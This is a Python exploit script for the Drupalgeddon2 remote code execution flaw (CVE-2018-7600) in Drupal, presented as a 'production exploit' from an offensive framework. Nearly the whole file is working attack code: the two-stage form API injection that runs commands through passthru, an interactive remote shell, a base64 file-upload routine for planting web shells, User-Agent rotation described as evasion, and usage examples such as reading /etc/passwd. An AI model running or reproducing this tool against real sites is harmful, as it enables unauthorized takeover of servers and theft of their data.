#!/usr/bin/env python3
"""
CVE-2018-7600 (Drupalgeddon2) - Production Exploit
Shadow Team Offensive Security Framework

Original research: Christian Mehlmauer (@_FireFart_)
Enhanced by: Shadow Team

Features:
  - CLI argument support with argparse
  - Multiple execution modes (single command, interactive shell, upload)
  - Advanced error handling and debugging
  - Connection validation and retry logic
  - Timeout configuration
  - Proxy support
  - Custom User-Agent rotation
  - Output parsing and cleanup
  - Verbose logging

CVE Details:
  - Drupal 7.x < 7.58
  - Drupal 8.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1
  - Remote Code Execution via form API exploitation
  - CVSS Score: 9.8 (Critical)

Usage:
  Single command:
    ./drupalgeddon2_pro.py -t http://target.com -c "whoami"

  Interactive shell:
    ./drupalgeddon2_pro.py -t http://target.com -i

  File upload:
    ./drupalgeddon2_pro.py -t http://target.com -u /path/to/shell.php -d /var/www/html/

  With proxy:
    ./drupalgeddon2_pro.py -t http://target.com -c "id" --proxy http://127.0.0.1:8080
"""

import requests
import re
import sys
import argparse
import urllib3
from urllib.parse import urljoin, urlparse
import random
import base64
import time

# Disable SSL warnings (for self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Color Codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# User-Agent rotation for evasion
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

class Drupalgeddon2:
    def __init__(self, target, proxy=None, timeout=10, verbose=False):
        """
        Initialize the exploit framework

        Args:
            target: Target URL (e.g., http://example.com)
            proxy: Proxy configuration (e.g., http://127.0.0.1:8080)
            timeout: Request timeout in seconds
            verbose: Enable verbose output
        """
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()

        # Configure proxy
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            if self.verbose:
                print(f"{Colors.OKBLUE}[*] Using proxy: {proxy}{Colors.ENDC}")

        # Set random User-Agent
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS)
        })

        # Disable SSL verification (use with caution)
        self.session.verify = False

    def log(self, message, level='info'):
        """Logging function with color coding"""
        if not self.verbose and level == 'debug':
            return

        color_map = {
            'info': Colors.OKBLUE,
            'success': Colors.OKGREEN,
            'warning': Colors.WARNING,
            'error': Colors.FAIL,
            'debug': Colors.OKCYAN
        }

        prefix_map = {
            'info': '[*]',
            'success': '[+]',
            'warning': '[!]',
            'error': '[-]',
            'debug': '[DEBUG]'
        }

        color = color_map.get(level, '')
        prefix = prefix_map.get(level, '[*]')
        print(f"{color}{prefix} {message}{Colors.ENDC}")

    def check_connection(self):
        """Verify target is reachable"""
        try:
            self.log(f"Testing connection to {self.target}", 'info')
            response = self.session.get(
                self.target,
                timeout=self.timeout,
                allow_redirects=True
            )

            if response.status_code == 200:
                self.log("Connection successful", 'success')
                return True
            else:
                self.log(f"Received status code: {response.status_code}", 'warning')
                return True  # Still reachable

        except requests.exceptions.Timeout:
            self.log(f"Connection timeout after {self.timeout}s", 'error')
            return False
        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection error: {str(e)}", 'error')
            return False
        except Exception as e:
            self.log(f"Unexpected error: {str(e)}", 'error')
            return False

    def check_vulnerability(self):
        """Check if target is vulnerable to CVE-2018-7600"""
        try:
            self.log("Checking for Drupal installation...", 'info')

            # Check for Drupal indicators
            response = self.session.get(self.target, timeout=self.timeout)

            drupal_indicators = [
                'X-Generator' in response.headers and 'Drupal' in response.headers['X-Generator'],
                'Drupal' in response.text,
                '/sites/default/files' in response.text,
                '/misc/drupal.js' in response.text
            ]

            if any(drupal_indicators):
                self.log("Drupal installation detected", 'success')

                # Try to identify version
                if 'X-Generator' in response.headers:
                    self.log(f"Version info: {response.headers['X-Generator']}", 'info')

                return True
            else:
                self.log("No Drupal indicators found", 'warning')
                self.log("Target may still be vulnerable - attempting exploitation", 'info')
                return True  # Proceed anyway

        except Exception as e:
            self.log(f"Vulnerability check failed: {str(e)}", 'error')
            return False

    def execute_command(self, command):
        """
        Execute arbitrary command on target

        Args:
            command: Command to execute

        Returns:
            Command output or None on failure
        """
        try:
            self.log(f"Executing command: {command}", 'debug')

            # Stage 1: Initial payload injection
            get_params = {
                'q': 'user/password',
                'name[#post_render][]': 'passthru',
                'name[#markup]': command,
                'name[#type]': 'markup'
            }

            post_params = {
                'form_id': 'user_pass',
                '_triggering_element_name': 'name'
            }

            self.log("Sending initial payload...", 'debug')
            response = self.session.post(
                self.target,
                data=post_params,
                params=get_params,
                timeout=self.timeout
            )

            # Extract form_build_id
            match = re.search(
                r'<input type="hidden" name="form_build_id" value="([^"]+)" />',
                response.text
            )

            if not match:
                self.log("Failed to extract form_build_id", 'error')
                self.log("Target may not be vulnerable or exploit failed", 'warning')
                return None

            form_build_id = match.group(1)
            self.log(f"Extracted form_build_id: {form_build_id}", 'debug')

            # Stage 2: Trigger execution
            get_params = {
                'q': f'file/ajax/name/#value/{form_build_id}'
            }

            post_params = {
                'form_build_id': form_build_id
            }

            self.log("Triggering payload execution...", 'debug')
            response = self.session.post(
                self.target,
                data=post_params,
                params=get_params,
                timeout=self.timeout
            )

            # Parse output
            output = self.parse_output(response.text)

            if output:
                self.log("Command executed successfully", 'success')
                return output
            else:
                self.log("No output received (command may have failed)", 'warning')
                return None

        except requests.exceptions.Timeout:
            self.log("Request timeout during exploitation", 'error')
            return None
        except Exception as e:
            self.log(f"Exploitation failed: {str(e)}", 'error')
            return None

    def parse_output(self, response_text):
        """
        Parse command output from response

        Args:
            response_text: Raw HTML response

        Returns:
            Cleaned command output
        """
        # Try to extract output from JSON response
        try:
            # Drupal returns JSON with command output
            import json

            # Remove potential leading characters
            cleaned = response_text.strip()
            if cleaned.startswith('['):
                data = json.loads(cleaned)
                if isinstance(data, list) and len(data) > 0:
                    # Output is typically in the first element
                    if 'data' in data[0]:
                        return data[0]['data'].strip()

            # Fallback: extract from HTML structure
            # Look for command output patterns
            patterns = [
                r'<div[^>]*>(.*?)</div>',
                r'<span[^>]*>(.*?)</span>',
                r'<p[^>]*>(.*?)</p>'
            ]

            for pattern in patterns:
                matches = re.findall(pattern, response_text, re.DOTALL)
                if matches:
                    # Filter out HTML tags
                    for match in matches:
                        cleaned = re.sub(r'<[^>]+>', '', match).strip()
                        if cleaned and len(cleaned) > 0:
                            return cleaned

            # Last resort: return full response
            return response_text.strip()

        except:
            return response_text.strip()

    def interactive_shell(self):
        """Launch interactive shell"""
        self.log("Starting interactive shell (type 'exit' to quit)", 'success')
        self.log("Commands are executed on the remote system", 'info')
        print()

        # Get initial info
        hostname = self.execute_command('hostname')
        username = self.execute_command('whoami')
        pwd = self.execute_command('pwd')

        prompt = f"{Colors.OKGREEN}{username}@{hostname}{Colors.ENDC}:{Colors.OKBLUE}{pwd}{Colors.ENDC}$ "

        while True:
            try:
                command = input(prompt).strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'quit', 'q']:
                    self.log("Exiting shell", 'info')
                    break

                # Execute command
                output = self.execute_command(command)

                if output:
                    print(output)
                else:
                    print(f"{Colors.WARNING}[No output or command failed]{Colors.ENDC}")

            except KeyboardInterrupt:
                print()
                self.log("Shell interrupted", 'warning')
                break
            except EOFError:
                print()
                break

    def upload_file(self, local_path, remote_path):
        """
        Upload file to target

        Args:
            local_path: Path to local file
            remote_path: Destination path on target
        """
        try:
            self.log(f"Reading file: {local_path}", 'info')

            with open(local_path, 'rb') as f:
                file_content = f.read()

            # Base64 encode for safe transmission
            encoded = base64.b64encode(file_content).decode()

            self.log(f"Uploading {len(file_content)} bytes to {remote_path}", 'info')

            # Write file using echo + base64 decode
            command = f"echo '{encoded}' | base64 -d > {remote_path}"

            output = self.execute_command(command)

            # Verify upload
            verify_command = f"ls -lah {remote_path}"
            verify_output = self.execute_command(verify_command)

            if verify_output and remote_path in verify_output:
                self.log(f"File uploaded successfully: {remote_path}", 'success')
                print(verify_output)
                return True
            else:
                self.log("File upload verification failed", 'error')
                return False

        except FileNotFoundError:
            self.log(f"Local file not found: {local_path}", 'error')
            return False
        except Exception as e:
            self.log(f"Upload failed: {str(e)}", 'error')
            return False

def banner():
    """Display exploit banner"""
    banner_text = f"""
{Colors.FAIL}
 ____                              _                    _     _             ____
|  _ \ _ __ _   _ _ __   __ _  ___| | __ _  ___  __| | __| | ___  _ __  |___ \\
| | | | '__| | | | '_ \ / _` |/ _ \ |/ _` |/ _ \/ _` |/ _` |/ _ \| '_ \   __) |
| |_| | |  | |_| | |_) | (_| |  __/ | (_| |  __/ (_| | (_| | (_) | | | | / __/
|____/|_|   \__,_| .__/ \__,_|\___|_|\__, |\___|\__,_|\__,_|\___/|_| |_||_____|
                 |_|                 |___/
{Colors.ENDC}
{Colors.OKBLUE}CVE-2018-7600 Remote Code Execution Exploit{Colors.ENDC}
{Colors.OKCYAN}Shadow Team Offensive Security Framework{Colors.ENDC}
{Colors.WARNING}Drupal 7.x < 7.58 | 8.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1{Colors.ENDC}
"""
    print(banner_text)

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='CVE-2018-7600 (Drupalgeddon2) Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Single command execution:
    %(prog)s -t http://192.168.1.100 -c "whoami"
    %(prog)s -t http://target.com:8080 -c "cat /etc/passwd"

  Interactive shell:
    %(prog)s -t http://target.com -i

  File upload:
    %(prog)s -t http://target.com -u shell.php -d /var/www/html/uploads/

  With proxy (for Burp/ZAP):
    %(prog)s -t http://target.com -c "id" --proxy http://127.0.0.1:8080

  Verbose mode:
    %(prog)s -t http://target.com -c "uname -a" -v
        '''
    )

    parser.add_argument('-t', '--target', required=True,
                        help='Target URL (e.g., http://example.com)')
    parser.add_argument('-c', '--command',
                        help='Command to execute')
    parser.add_argument('-i', '--interactive', action='store_true',
                        help='Launch interactive shell')
    parser.add_argument('-u', '--upload',
                        help='Local file to upload')
    parser.add_argument('-d', '--destination',
                        help='Remote destination path for upload')
    parser.add_argument('--proxy',
                        help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--no-check', action='store_true',
                        help='Skip vulnerability check')

    args = parser.parse_args()

    # Validate arguments
    if not args.command and not args.interactive and not args.upload:
        parser.error("Must specify -c, -i, or -u")

    if args.upload and not args.destination:
        parser.error("Upload requires -d/--destination")

    # Initialize exploit
    exploit = Drupalgeddon2(
        target=args.target,
        proxy=args.proxy,
        timeout=args.timeout,
        verbose=args.verbose
    )

    # Connection check
    if not exploit.check_connection():
        exploit.log("Cannot reach target - check URL and network connectivity", 'error')
        sys.exit(1)

    # Vulnerability check
    if not args.no_check:
        if not exploit.check_vulnerability():
            exploit.log("Vulnerability check failed", 'error')
            exploit.log("Use --no-check to skip this check", 'info')
            sys.exit(1)

    # Execute based on mode
    if args.interactive:
        exploit.interactive_shell()
    elif args.upload:
        success = exploit.upload_file(args.upload, args.destination)
        sys.exit(0 if success else 1)
    elif args.command:
        output = exploit.execute_command(args.command)
        if output:
            print(f"\n{Colors.OKGREEN}[Command Output]{Colors.ENDC}")
            print(output)
            sys.exit(0)
        else:
            exploit.log("Command execution failed", 'error')
            sys.exit(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.FAIL}[-] Fatal error: {str(e)}{Colors.ENDC}")
        sys.exit(1)
